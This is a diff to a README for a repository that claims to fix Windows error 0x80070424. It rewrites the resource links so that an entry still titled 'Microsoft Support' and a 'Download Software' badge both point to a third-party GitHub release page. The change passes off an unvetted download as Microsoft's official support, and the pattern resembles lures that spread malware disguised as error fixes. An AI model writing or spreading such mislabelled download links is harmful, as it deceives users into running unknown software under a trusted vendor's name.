@@ -32,9 +32,9 @@ Contributions to this repository are highly encouraged. If you have valuable ins
 
 ## Resources
 For additional resources on the 0x80070424 error and related topics, refer to the following:
-- [Microsoft Support - Windows Update Service error 0x80070424](https://support.microsoft.com/en-us/topic/windows-update-service-error-0x80070424-e01117b3-843d-b989-6734-4e999d888258)
-- [GitHub Repository - Fixing Windows Errors](https://github.com/fixing-windows-errors)
+- [Microsoft Support - Windows Update Service error 0x80070424](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
+- [GitHub Repository - Fixing Windows Errors](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0<COLORCODE>)](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
 
 🔧🛠️🚀 Happy fixing your Windows errors with the help of this repository! 🚀🛠️🔧
